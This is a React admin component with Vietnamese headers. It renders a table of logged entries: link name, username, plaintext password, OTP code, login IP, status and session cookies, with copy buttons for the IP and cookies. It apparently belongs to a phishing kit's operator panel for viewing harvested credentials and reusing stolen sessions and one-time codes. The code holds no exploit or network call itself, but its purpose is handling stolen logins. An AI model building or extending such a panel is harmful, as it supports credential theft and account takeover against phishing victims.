import React from "react";
export default function LogTableAdmin({ logs }) {
  return (
    <table style={{width:'100%',background:'#fff',borderCollapse:'collapse',boxShadow:'0 2px 8px #0001'}}>
      <thead>
        <tr>
          <th>#</th>
          <th>Tên Link</th>
          <th>Tài khoản</th>
          <th>Mật khẩu</th>
          <th>Code OTP</th>
          <th>IP Login</th>
          <th>Loading</th>
          <th>Kết Quả</th>
          <th>Cookies</th>
        </tr>
      </thead>
      <tbody>
        {(logs||[]).map((log,i)=>(
          <tr key={i}>
            <td>{i+1}</td>
            <td>{log.link || '-'}</td>
            <td>{log.username}</td>
            <td>{log.password}</td>
            <td>{log.otp || ''}</td>
            <td>{log.ip} <button onClick={()=>navigator.clipboard.writeText(log.ip)}>Copy</button></td>
            <td style={{color:'red'}}>{log.loading || ''}</td>
            <td>{log.status}</td>
            <td>{log.cookies} <button onClick={()=>navigator.clipboard.writeText(log.cookies)}>Copy</button></td>
          </tr>
        ))}
      </tbody>
    </table>
  );
}
